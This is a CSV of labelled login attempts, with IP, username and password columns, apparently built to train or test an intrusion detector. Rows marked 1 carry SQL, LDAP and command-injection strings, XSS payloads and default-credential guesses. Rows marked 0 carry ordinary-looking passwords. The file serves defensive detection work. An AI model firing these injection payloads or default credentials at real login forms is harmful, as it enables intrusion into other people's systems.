ip,username,password,label
186.140.104.51,' or '' like ',&lt;&gt;&quot;'%;)(&amp;+,1
111.181.130.9,apc,pbcpbn,1
60.48.70.36,cui,3333333.net,0
66.43.121.234,</script><script>alert(1759)</script>,"<XSS STYLE=""xss:expression(alert(1667))"">",1
90.120.4.149,di,h_froeschl7,0
111.148.148.102,%2A%7C,distinct,1
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
141.158.95.201,"<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC="";javas]]>;<;![CDATA[cript:alert(1904);"";>;]]>;","<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(874)</script>"">",1
186.140.104.51,or 1=1--,char%4039%41%2b%40SELECT,1
144.77.102.150,IMAGEUSER,Sxyz,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,apc,qsysopr,1
66.43.121.234,"`""'><img src=xxx:x onerror\x09=javascript:alert(1474)>","&#00;</form><input type&#61691;""date"" onfocus=""alert(1691)"">",1
111.148.148.102,%20$(sleep%2050),hi or a=a,1
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
141.158.95.201,"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1195)""></iframe onLoad>",<input onblur=javascript:alert(564) autofocus><input autofocus>,1
144.77.102.150,IMAGEUSER,nopasswd,1
186.140.104.51,--,bfilename,1
111.181.130.9,apc,qwertyuiop,1
60.48.70.36,cui,3333333.net,0
111.148.148.102,' or ''=',declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
66.43.121.234,"""><script>alert(1868)</script>","<img \x15141514src=x onerror=""javascript:alert(1514)"">",1
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
90.120.4.149,di,h_froeschl7,0
141.158.95.201,"<IMG SRC=x onloadstart=""alert(1116))"">",<STYLE>a{background:url('s698' 's2)}@import javascript:javascript:alert(698);');}</STYLE>,1
144.77.102.150,IMAGEUSER,VIRUSER,1
186.140.104.51,%2A%28%7C%28mail%3D%2A%29%29,'%20or%201=1,1
60.48.70.36,cui,3333333net,0
111.181.130.9,apc,JDE,1
111.148.148.102,hi') or ('a'='a,like,1
66.43.121.234,&lt;DIV STYLE=&quot;background-image: url(javascript:alert(1811))&quot;&gt;,</TITLE><SCRIPT>alert(736);</SCRIPT>,1
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
90.120.4.149,di,h_froeschl7,0
141.158.95.201,"<a href=""\x0Ejavascript:javascript:alert(446)"" id=""fuzzelement446"">test</a>","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(1035);"">",1
186.140.104.51,'sqlattempt1,&,1
144.77.102.150,IMAGEUSER,setup,1
111.181.130.9,apc,SMDR,1
60.48.70.36,cui,3333333.net,0
25.97.124.103,dang,isi-wbc11,0
111.148.148.102,%2A%7C,\x3D \x27,1
66.43.121.234,"""><SCRIPT>alert(1786))</SCRIPT><img src="""" alt=""","ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1325)"">DEF",1
178.147.201.106,qiu,@126.comopen,0
90.120.4.149,di,h_fr?oeschl7,0
141.158.95.201,"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1208)""></html onMouseLeave>",<script /**/>/**/alert(1147)/**/</script /**/,1
186.140.104.51,' or ''=',%28,1
144.77.102.150,IMAGEUSER,asdfgh,1
111.181.130.9,REP_MANAGER,ZXDSL,1
60.48.70.36,tao,crack1/3,0
111.148.148.102,%20$(sleep%2050),%29,1
25.97.124.103,dang,isi-wbc11,0
66.43.121.234,"<a href=""\x09javascript:javascript:alert(453)"" id=""fuzzelement453"">test</a>","<IMG SRC=x onwheel=""alert(1094))"">",1
178.147.201.106,qiu,@126.comopen,0
90.120.4.149,di,h_froeschl7,0
144.77.102.150,IMAGEUSER,Admin@storage,1
186.140.104.51,%26,' or ''=',1
141.158.95.201,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(679);"">","""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(387);/*';"">DEF",1
60.48.70.36,tao,crack1/3G,0
111.181.130.9,REP_MANAGER,digicel,1
178.147.201.106,qiu,@126.comopen,0
111.148.148.102,bfilename,or 1=1--,1
66.43.121.234,"<style><img src=""</style><img src=x onerror=alert(869)//"">",<brute onmousedown=alert(185)>click this!,1
25.97.124.103,dang,isi-wbc11,0
167.147.158.41,hwacshell,NetVCR,1
186.140.104.51,update,',1
141.158.95.201,&lt;SCRIPT&gt;alert(906);&lt;/SCRIPT&gt;,"ABC<div style=""x:exp\x00ression(javascript:alert(410)"">DEF",1
144.77.102.150,device,software01,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,REP_MANAGER,l2,1
163.201.115.62,gou,yuliana29.89,0
178.147.201.106,qiu,@126.comopen,0
66.43.121.234,"<TABLE BACKGROUND=""javascript:alert(760)"">","<IMG SRC=x oncanplaythrough=""alert(1108))"">",1
25.97.124.103,dang,isi-wbc11,0
167.147.158.41,hwacshell,VAX,1
141.158.95.201,"ABC<div style=""x:\x00expression(javascript:alert(425)"">DEF","<a href=""\x0Bjavascript:javascript:alert(1333)"" id=""fuzzelement1333"">test</a>",1
186.140.104.51,' and '' like ',or 1=1--,1
144.77.102.150,device,TLS,1
111.181.130.9,REP_MANAGER,iloveyou,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,hwacshell,123qaz,1
163.201.115.62,gou,yuliana29.89,0
66.43.121.234,<body onscroll=javascript:alert(696)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,"<;IMG SRC="";javascript:alert(1886);"";>;",1
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
186.140.104.51,' or ''=','sqlattempt1,1
141.158.95.201,"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(958)"">TESTHTML5FORMACTION","[color=red' onmouseover=""alert(1739)""]mouse over[/color]",1
144.77.102.150,device,news,1
111.181.130.9,REP_MANAGER,MiniAP,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,hwacshell,changeonfirstlogin,1
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
163.201.115.62,gou,yuliana29.89,0
66.43.121.234,"<body onFocus body onFocus=""javascript:javascript:alert(298)""></body onFocus>","<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1155)&NewLine;>X</a>",1
144.77.102.150,device,STEEL,1
141.158.95.201,"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1317)"">DEF","<IMG SRC=x oncanplay=""alert(1107))"">",1
186.140.104.51,"or 0=0 #""",",@variable",1
60.48.70.36,tao,crack1/3,0
111.181.130.9,REP_MANAGER,123456a.,1
167.147.158.41,hwacshell,central,1
25.97.124.103,ming,1/2research,0
178.147.201.106,qiu,@126.comopen,0
163.201.115.62,gou,yuliana29.89,0
66.43.121.234,<IMG SRC=javascript:alert(1716)>,"<a href=""\xE2\x80\x80javascript:javascript:alert(1342)"" id=""fuzzelement1342"">test</a>",1
186.140.104.51,')%20or%20('x'='x,' or 3=3,1
141.158.95.201,"<body onblur body onblur=""javascript:javascript:alert(1250)""></body onblur>",<script>alert(231)</script>,1
144.77.102.150,device,MUMBLEFRATZ,1
111.181.130.9,mountsys,corecess,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,hwacshell,adtran,1
178.147.201.106,qiu,@126.comopen,0
66.43.121.234,"<body onblur body onblur=""javascript:javascript:alert(351)""></body onblur>","""`'><script>-javascript:alert(1417)</script>",1
25.97.124.103,ming,1/2research,0
163.201.115.62,gou,yuliana29.89,0
212.222.69.161,gan,1%unter,0
141.158.95.201,<IMG SRC=”jav ascript:alert(842);”>,<BODY ONLOAD=alert(987)>,1
144.77.102.150,device,!root,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,mountsys,weblogic1,1
167.147.158.41,hwacshell,mail,1
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,ming,1/2research,0
163.201.115.62,gou,yuliana29.89,0
66.43.121.234,<<SCRIPT>alert(858);//<</SCRIPT>,"<input type=""text"" value=`` <div/onmouseover='alert(824)'>X</div>",1
212.222.69.161,gan,1%hunter,0
141.158.95.201,"""`'><script>\xC2\xA0javascript:alert(537)</script>","<IMG SRC=x onload=""alert(1132))"">",1
144.77.102.150,device,ftp,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,mountsys,Admin@9000,1
167.147.158.41,hwacshell,ALLIN1MAIL,1
178.147.201.106,qiu,@126.comopen,0
163.201.115.62,gou,yuliana29.89,0
25.97.124.103,ming,1/2research,0
66.43.121.234,"<DIV STYLE=""width: expression(alert(1803));"">","<img \x00src=x onerror=""javascript:alert(1525)"">",1
141.158.95.201,"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1282)//></style>","<;IFRAME SRC="";javascript:alert(1884);"";>;<;/IFRAME>;",1
212.222.69.161,gan,1%hunter,0
144.77.102.150,device,SNMP_trap,1
111.181.130.9,mountsys,foolproof,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,hwacshell,BATCH,1
178.147.201.106,qiu,@126.comopen,0
163.201.115.62,gou,yuliana29.89,0
66.43.121.234,"<form><iframe &#09;&#11500;&#11501150; src=""javascript&#58;alert(1150)""&#11501150;&#11500;&#09;;>","<IMG STYLE=""xss:expr/*XSS*/ession(alert(1028))"">",1
25.97.124.103,ming,1/2research,0
212.222.69.161,gan,1%hunter-,0
141.158.95.201,<BODY ONLOAD=javascript:alert(666)>,"<a href=""javas\x0Acript:javascript:alert(1268)"" id=""fuzzelement1268"">test</a>",1
144.77.102.150,device,medion,1
111.181.130.9,mountsys,condo,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,hwacshell,1q2w3e4r5t,1
178.147.201.106,qiu,@126.comopen,0
163.201.115.62,gou,yuliana29.89,0
2.58.17.39,having,//,1
25.97.124.103,ming,1/2research,0
212.222.69.161,gan,1%hunter,0
144.77.102.150,device,fax,1
141.158.95.201,"""><img src=x onerror=javascript:alert(1465)>","<script src=""data:text/javascript,alert(1696)""></script>",1
111.181.130.9,SPOOLMAN,PUBSUB,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,snake,thanos123.com,1
178.147.201.106,qiu,@126.comopen,0
163.201.115.62,gou,yuliana29.89,0
25.97.124.103,ming,1/2research,0
2.58.17.39,like,' or (EXISTS),1
212.222.69.161,gan,1%hunter,0
144.77.102.150,cablecom,ip21,1
141.158.95.201,"ABC<div style=""x:expression\x00(javascript:alert(1308)"">DEF",""";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(1927)>;",1
60.48.70.36,tao,crack1/3,0
111.181.130.9,SPOOLMAN,C0de,1
167.147.158.41,snake,LASERWRITER,1
178.147.201.106,qiu,@126.comopen,0
2.58.17.39,"hi or 1=1 --""",' or '1'='1'--,1
163.201.115.62,gou,yuliana29.89,0
25.97.124.103,ming,1/2research,0
141.158.95.201,javascript:alert(853),<svg/onload=alert(91),1
212.222.69.161,gan,1%hunter,0
144.77.102.150,cablecom,Aa123321,1
111.181.130.9,SPOOLMAN,protech,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,snake,1502,1
178.147.201.106,qiu,@126.comopen,0
163.201.115.62,gou,yuliana29.89,0
2.58.17.39,%28,= --,1
25.97.124.103,ming,1/2research,0
141.158.95.201,<script>alert(1720))</script>,"<object src=1191 href=1191 onerror=""javascript:alert(1191)""></object>",1
212.222.69.161,gan,1%hunter,0
144.77.102.150,cablecom,field,1
111.181.130.9,SPOOLMAN,football,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,snake,tini,1
178.147.201.106,hong,100%acer,0
2.58.17.39,@variable,%7C,1
163.201.115.62,gou,yuliana29.89,0
25.97.124.103,ming,1/2research,0
141.158.95.201,"<STYLE>li {list-style-image: url(""javascript:javascript:alert(677)"");}</STYLE><UL><LI>XSS","&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert(897))\""&gt;",1
212.222.69.161,gan,1%hunter,0
144.77.102.150,cablecom,CLERK,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,SPOOLMAN,hqadmin,1
167.147.158.41,snake,P@$$word123,1
178.147.201.106,hong,100%acer,0
25.97.124.103,ming,1/2research,0
163.201.115.62,gou,yuliana29.89,0
2.58.17.39,"""hi"""") or (""""a""""=""""a""",' or user like '%,1
144.77.102.150,cablecom,!q2w3e4r,1
141.158.95.201,"&lt;BGSOUND SRC=\""javascript&#058;alert(885);\""&gt;","'`""><\x3Cscript>javascript:alert(285)</script>",1
212.222.69.161,gan,1%hunter,0
60.48.70.36,tao,crack1/3,0
111.181.130.9,VMS,d.e.b.u.g,1
167.147.158.41,snake,ascend,1
178.147.201.106,hong,100%acer,0
25.97.124.103,ming,1/2research,0
2.58.17.39,' or uid like '%,' aND '' like '%,1
163.201.115.62,gou,yuliana29.89,0
212.222.69.161,gan,1%hunter,0
141.158.95.201,"<IMG SRC=""jav&#x0D;ascript:alert(729);"">","<a href=""javas\x06cript:javascript:alert(1277)"" id=""fuzzelement1277"">test</a>",1
144.77.102.150,servlet,2WSXcde,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,VMS,PORTAL30_SSO_PUBLIC,1
167.147.158.41,snake,iscopy,1
178.147.201.106,hong,100%acer,0
2.58.17.39,'||UTL_HTTP.REQUEST,'; exec xp_regread,1
163.201.115.62,gou,yuliana29.89,0
25.97.124.103,ming,1/2research,0
105.236.252.217,WKSYS,mom,1
212.222.69.161,gan,1%hnter,0
144.77.102.150,servlet,MCUrv,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,VMS,passwd11,1
167.147.158.41,snake,ssp,1
178.147.201.106,hong,100%acer,0
2.58.17.39,%2A%28%7C%28objectclass%3D%2A%29%29,%2A%7C,1
163.201.115.62,gou,yuliana29.~89,0
25.97.124.103,ming,1/2Qesearch,0
105.236.252.217,WKSYS,1234qwer,1
212.222.69.161,gan,1%hunter,0
144.77.102.150,servlet,7936,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,VMS,DEMO8,1
167.147.158.41,VSEIPO,987654321,1
178.147.201.106,hong,100%acer,0
2.58.17.39,insert,\x27,1
25.97.124.103,ming,1/2research,0
163.201.115.62,gou,yuliana29.89,0
212.222.69.161,gan,1%hunter,0
105.236.252.217,WKSYS,cr0wmt,1
144.77.102.150,servlet,AQJAVA,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,VMS,SSA,1
167.147.158.41,VSEIPO,qwasyx21,1
178.147.201.106,hong,100%acer,0
163.201.115.62,gou,yuliana29.89,0
25.97.124.103,ming,1/2reseaQch,0
2.58.17.39,hi') or ('a'='a,*(|(objectclass=*)),1
105.236.252.217,WKSYS,q,1
144.77.102.150,servlet,man,1
212.222.69.161,gan,1%hunter,0
60.48.70.36,tao,crack1/3,0
111.181.130.9,VMS,AIROPLANE,1
167.147.158.41,VSEIPO,browsepw,1
178.147.201.106,hong,3100%acer,0
163.201.115.62,gou,yuliana29.89,0
2.58.17.39,"<>""'%;)(&+",exec sp,1
25.97.124.103,ming,1/2reCsearch,0
212.222.69.161,gan,1%hunter,0
105.236.252.217,WKSYS,Zte521,1
144.77.102.150,LIBRARY,GUESTGUEST,1
111.181.130.9,xampp,merlin,1
60.48.70.36,tao,Ecrack1/3,0
167.147.158.41,VSEIPO,EVENT,1
178.147.201.106,hong,100%acer,0
25.97.124.103,ming,1/2research,0
2.58.17.39,"""a"""" or 3=3--""",' and 2>3--,1
163.201.115.62,du,@sina.com6th,0
212.222.69.161,gan,1%hunter,0
105.236.252.217,WKSYS,bcmspw,1
144.77.102.150,LIBRARY,GlobalAdmin,1
167.147.158.41,VSEIPO,MCUrv,1
60.48.70.36,tao,crack1/3,0
111.181.130.9,xampp,*ARIS!1dm9n#,1
178.147.201.106,hong,100%acer,0
2.58.17.39,char%4039%41%2b%40SELECT,x' AND members.email IS NULL; --,1
163.201.115.62,du,@sina.com6th,0
25.97.124.103,ming,1/2research,0
105.236.252.217,WKSYS,Polrty,1
212.222.69.161,gan,1%hunter,0
144.77.102.150,LIBRARY,CDEMO82,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,VSEIPO,BPMS,1
111.181.130.9,xampp,qsrvbas,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
2.58.17.39,(,' or a=a--,1
25.97.124.103,ming,1/2research,0
105.236.252.217,WKSYS,456789,1
144.77.102.150,LIBRARY,coremail,1
212.222.69.161,gan,1%hunter,0
111.181.130.9,xampp,primeos,1
60.48.70.36,tao,crack1/3,0
167.147.158.41,VSEIPO,FINANCE,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
25.97.124.103,ming,1/2research,0
2.58.17.39,'||UTL_HTTP.REQUEST,""" or 0=0 #",1
105.236.252.217,bbsd-client,PRINTER,1
212.222.69.161,gan,1%hunter,0
144.77.102.150,LIBRARY,ncrm,1
220.193.78.128,fan,@163.comlink,0
111.181.130.9,xampp,888888,1
167.147.158.41,VSEIPO,factory,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
25.97.124.103,ming,1/2research,0
2.58.17.39,' or uname like '%,' or uid like '%,1
105.236.252.217,bbsd-client,xyzall,1
212.222.69.161,gan,1%hunter,0
144.77.102.150,LIBRARY,pwPower,1
111.181.130.9,xampp,antsle,1
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wlcsystem,TrippLite,1
178.147.201.106,hong,100%ace,0
163.201.115.62,du,@sina.com6th,0
25.97.124.103,feng,1a2b3c~!@,0
2.58.17.39,' and 2>1--,admin'--,1
105.236.252.217,bbsd-client,pwAdmin,1
212.222.69.161,gan,1%hunter,0
144.77.102.150,LIBRARY,gen2,1
220.193.78.128,fan,@163.comlink,0
111.181.130.9,mother,rdc123,1
167.147.158.41,wlcsystem,PBX,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
25.97.124.103,feng,1a2b3c~!@,0
2.58.17.39,%2A%7C,'hi' or 'x'='x';,1
144.77.102.150,LIBRARY,Passw0rd#123,1
212.222.69.161,gan,1%hunter,0
105.236.252.217,bbsd-client,adminer3200,1
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wlcsystem,!root,1
111.181.130.9,mother,nopasswd,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
2.58.17.39,\x27,*(|(objectclass=*)),1
25.97.124.103,feng,1a2b3c~!@,0
212.222.69.161,gan,A%hunter,0
105.236.252.217,bbsd-client,BC4J,1
144.77.102.150,LIBRARY,CISSUS,1
220.193.78.128,fan,@163.comlink,0
111.181.130.9,mother,edr@sangfor,1
167.147.158.41,wlcsystem,DES,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
25.97.124.103,feng,1a2b3c~!@,0
2.58.17.39,' and '' like ',order by,1
105.236.252.217,bbsd-client,tigger,1
117.254.169.198,xing,X-rated2164,0
55.132.207.237,mao,0000@q.com,0
220.193.78.128,fan,M@163.comlink,0
167.147.158.41,wlcsystem,fw,1
111.181.130.9,mother,240653C9467E45,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
2.58.17.39,= ;,"<>""'%;)(&+",1
25.97.124.103,feng,1a2b3c~!@,0
105.236.252.217,bbsd-client,mysweex,1
55.132.207.237,mao,0000@qq.com,0
117.254.169.198,xing,X-rated2164,0
111.181.130.9,mother,MiniAP,1
178.147.201.106,hong,1>0%acer,0
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wradmin,NAMES,1
163.201.115.62,du,@sina.com6th,0
25.97.124.103,feng,1a2b3c~!@,0
2.58.17.39,' or 1=1--,%20$(sleep%2050),1
105.236.252.217,bubba,uucpadm,1
55.132.207.237,mao,0000@qq.com,0
117.254.169.198,xing,X-rated2164,0
111.181.130.9,mother,ISPMODE,1
167.147.158.41,wradmin,FOOBAR,1
178.147.201.106,hong,100%acer,0
220.193.78.128,fan,@163.comlink,0
163.201.115.62,du,@sia.com6th,0
2.58.17.39,\x23,insert,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated2164,0
105.236.252.217,bubba,$SRV,1
55.132.207.237,mao,0000@qq.com,0
34.190.62.121,ni,qwert1/3,0
178.147.201.106,hong,100%acer,0
167.147.158.41,wradmin,CCC,1
220.193.78.128,fan,@163.comlink,0
163.201.115.62,du,@sina.com6th,0
2.58.17.39,(sqlattempt2),%2A%28%7C%28objectclass%3D%2A%29%29,1
25.97.124.103,feng,1a2b3c~!@,0
105.236.252.217,bubba,admin_1,1
117.254.169.198,xing,?-rated2164,0
34.190.62.121,ni,qwert1/3,0
55.132.207.237,mao,0000@qq.com,0
178.147.201.106,hong,100%acer,0
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wradmin,?award,1
163.201.115.62,du,@sina.com6th,0
2.58.17.39,or,x' or 1=1 or 'x'='y,1
25.97.124.103,feng,1a2b3c~!@,0
34.190.62.121,ni,qwert1/3,0
117.254.169.198,xing,X-rated2164,0
105.236.252.217,bubba,UI-PSWD-02,1
55.132.207.237,mao,0000@qq.com,0
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wradmin,par0t,1
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
25.97.124.103,feng,1a2b3c~!@,0
114.56.81.141,fam,joshua,1
117.254.169.198,xing,X-rated2164,0
105.236.252.217,bubba,ucenik,1
55.132.207.237,mao,0000@qq.com,0
34.190.62.121,ni,qwert1/3,0
220.193.78.128,fan,@163.comlink,0
178.147.201.106,hong,100%acer,0
167.147.158.41,wradmin,PORTAL31,1
163.201.115.62,du,@sina.com6th,0
114.56.81.141,fam,256256,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated2164,0
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wradmin,db2pass,1
105.236.252.217,bubba,240653C9467E45,1
34.190.62.121,ni,qwert1/3,0
178.147.201.106,hong,100%acer,0
55.132.207.237,mao,0000@qq.com,0
163.201.115.62,du,@sina.com6th,0
114.56.81.141,fam,netscreen,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated2164,0
105.236.252.217,bubba,admin321,1
163.201.115.62,du,@sina.com6th,0
220.193.78.128,fan,@163.comlink,0
178.147.201.106,hong,100%acer,0
167.147.158.41,wradmin,FAXWORKS,1
55.132.207.237,mao,0000@qq.com,0
34.190.62.121,ni,qwert1/3,0
114.56.81.141,fam,sx2000,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated2164,0
163.201.115.62,du,@sina.com6th,0
55.132.207.237,mao,0000@qq.com,0
178.147.201.106,hong,100%acer,0
220.193.78.128,fan,@163.comlink,0
167.147.158.41,wradmin,initpw,1
34.190.62.121,ni,qwert1/3,0
105.236.252.217,bubba,pass,1
25.97.124.103,feng,1a2b3c~!@,0
114.56.81.141,fam,7061992,1
117.254.169.198,xing,X-rated2164,0
163.201.115.62,du,@sina.com6th,0
178.147.201.106,hong,100%acer,0
220.193.78.128,fan,@163.comlink,0
105.236.252.217,bubba,snake,1
167.147.158.41,LIBRARIAN,FNDPUB,1
55.132.207.237,mao,0000@qq.com,0
34.190.62.121,ni,qwert1/3,0
25.97.124.103,feng,1a2b3c~!@,0
114.56.81.141,fam,TSUSER,1
117.254.169.198,xing,X-rated2164,0
178.147.201.106,hong,100%acer,0
163.201.115.62,du,@sina.com6th,0
34.190.62.121,ni,qwertW1/3,0
220.193.78.128,fan,@163.comlink,0
105.236.252.217,bubba,netopia,1
167.147.158.41,LIBRARIAN,qsrvbas,1
55.132.207.237,mao,0000@qq.com,0
114.56.81.141,SAP*,rje,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rLated2164,0
122.52.106.45,zhan,2GqHir*EhjSa,0
71.152.73.190,feng,2013www.,0
220.193.78.128,fan,@163.comlink,0
105.236.252.217,CDEMORID,Sxyz,1
167.147.158.41,LIBRARIAN,raspberry,1
34.190.62.121,ni,qwert1/3,0
55.132.207.237,mao,0000@qq.com,0
114.56.81.141,SAP*,#l@$ak#.lk;0@P,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated164,0
122.52.106.45,zhan,2GqHir*EhjSa,0
71.152.73.190,feng,2013'www.,0
105.236.252.217,CDEMORID,aa123456,1
167.147.158.41,LIBRARIAN,brocade1,1
55.132.207.237,mao,000@qq.com,0
220.193.78.128,fan,@163.cFomlink,0
34.190.62.121,ni,qwert1/3,0
25.97.124.103,feng,12b3c~!@,0
117.254.169.198,xing,X-rated2164,0
114.56.81.141,SAP*,EltakoFVS,1
71.152.73.190,feng,2013www.,0
122.52.106.45,zhan,2GqHir*EhjSa,0
34.190.62.121,ni,qwert1/3,0
220.193.78.128,fan,@163.comlink,0
105.236.252.217,CDEMORID,factory,1
167.147.158.41,LIBRARIAN,leviton,1
55.132.207.237,mao,0000@qq.com,0
117.254.169.198,xing,X-rated2164,0
114.56.81.141,SAP*,HTTP,1
25.97.124.103,feng,1a2b3c~!@,0
71.152.73.190,feng,2013www.,0
122.52.106.45,zhan,2GqHir*EhjSa,0
34.190.62.121,ni,qwert1/3,0
220.193.78.128,fan,@163.comlink,0
105.236.252.217,CDEMORID,8,1
55.132.207.237,mao,0000@qq.com,0
167.147.158.41,LIBRARIAN,klv123,1
114.56.81.141,SAP*,basisk,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated2164,0
122.52.106.45,zhan,2GqHir*EhjSa,0
71.152.73.190,feng,2013www.,0
105.236.252.217,CDEMORID,pass1,1
220.193.78.128,fan,@163.comlink,0
55.132.207.237,mao,0000@qq.com,0
34.190.62.121,ni,qwert1/3,0
167.147.158.41,ftp_admi,leadsec.useradmin,1
114.56.81.141,SAP*,protection,1
25.97.124.103,feng,1a2b3c~!@,0
117.254.169.198,xing,X-rated2164,0
71.152.73.190,feng,2013www.,0
122.52.106.45,zhan,2GqHir*EhjSa,0
34.190.62.121,ni,qwert1/3,0
55.132.207.237,mao,000B0@qq.com,0
105.236.252.217,CDEMORID,trancell,1
162.166.241.217,lian,dddd100%,0
167.147.158.41,ftp_admi,11111,1
117.254.169.198,xing,X-rated2164,0
25.97.124.103,feng,1a2b3c~!@,0
114.56.81.141,SAP*,ISPMODE,1
122.52.106.45,zhan,GqHir*EhjSa,0
71.152.73.190,feng,2013www.,0
105.236.252.217,CDEMORID,123456qq,1
162.166.241.217,lian,dddd100%,0
34.190.62.121,ni,qwert1/3,0
167.147.158.41,ftp_admi,3477,1
55.132.207.237,mao,0000@qq.com,0
25.97.124.103,feng,1a2b3c~!@,0
114.56.81.141,SAP*,=,1
117.254.169.198,xing,X-rated2164,0
122.52.106.45,zhan,2GqHir*EhjSa,0
71.152.73.190,feng,2013www.,0
162.166.241.217,lian,dddd100%,0
105.236.252.217,CDEMORID,987654321,1
55.132.207.237,mao,0000@qq.com,0
34.190.62.121,ni,qwert1/3,0
